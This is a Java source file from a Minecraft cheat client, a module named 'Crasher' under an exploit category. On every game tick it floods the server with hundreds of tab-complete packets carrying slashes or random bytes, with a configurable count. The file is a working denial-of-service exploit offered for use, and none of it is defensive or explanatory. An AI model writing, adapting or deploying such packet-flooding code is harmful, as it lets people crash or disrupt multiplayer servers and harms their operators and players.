/**
 * 
 */
package cafe.kagu.kagu.mods.impl.exploit;

import org.apache.commons.lang3.RandomUtils;

import cafe.kagu.kagu.eventBus.EventHandler;
import cafe.kagu.kagu.eventBus.Handler;
import cafe.kagu.kagu.eventBus.impl.EventCheatRenderTick;
import cafe.kagu.kagu.eventBus.impl.EventPacketReceive;
import cafe.kagu.kagu.eventBus.impl.EventTick;
import cafe.kagu.kagu.mods.Module;
import cafe.kagu.kagu.settings.impl.IntegerSetting;
import cafe.kagu.kagu.settings.impl.ModeSetting;
import cafe.kagu.kagu.utils.MiscUtils;
import net.minecraft.network.login.server.S00PacketDisconnect;
import net.minecraft.network.play.client.C14PacketTabComplete;
import net.minecraft.network.play.server.S40PacketDisconnect;
import net.minecraft.util.BlockPos;

/**
 * @author lavaflowglow
 *
 */
public class ModCrasher extends Module {
	
	public ModCrasher() {
		super("Crasher", Category.EXPLOIT);
		setSettings(mode, tabCompleteMode, tabCompletePacketAmount);
	}
	
	private ModeSetting mode = new ModeSetting("Mode", "Tab Complete", "Tab Complete");
	
	// Tab complete mode
	private ModeSetting tabCompleteMode = (ModeSetting) new ModeSetting("Tab Complete Mode", "Slash", "Slash", "Empty", "Random", "Slash Random").setDependency(() -> mode.is("Tab Complete"));
	private IntegerSetting tabCompletePacketAmount = (IntegerSetting) new IntegerSetting("Packet Amount", 500, 50, 1000, 50).setDependency(() -> mode.is("Tab Complete"));
	
	@EventHandler
	private Handler<EventTick> onTick = e -> {
		if (e.isPost())
			return;
		
		switch (mode.getMode()) {
			case "Tab Complete":{
				String message = "";
				switch (tabCompleteMode.getMode()) {
					case "Slash":{
						message = "/";
					}break;
					case "Empty":break;
					case "Random":{
						message = new String(RandomUtils.nextBytes(RandomUtils.nextInt(20, 60)));
					}break;
					case "Slash Random":{
						message = "/" + new String(RandomUtils.nextBytes(RandomUtils.nextInt(20, 60)));
					}break;
				}
				BlockPos blockPos = null;
				try {
					blockPos = mc.objectMouseOver.getBlockPos();
				}catch(Exception e1) {
					
				}
				for (int i = 0; i < tabCompletePacketAmount.getValue(); i++) {
					mc.getNetHandler().getNetworkManager().sendPacket(new C14PacketTabComplete(message, blockPos));
				}
			}break;
		}
	};
	
	@EventHandler
	private Handler<EventCheatRenderTick> onCheatTick = e -> {
		if (mc.theWorld == null || mc.thePlayer == null) {
			toggle();
		}
	};
	
}
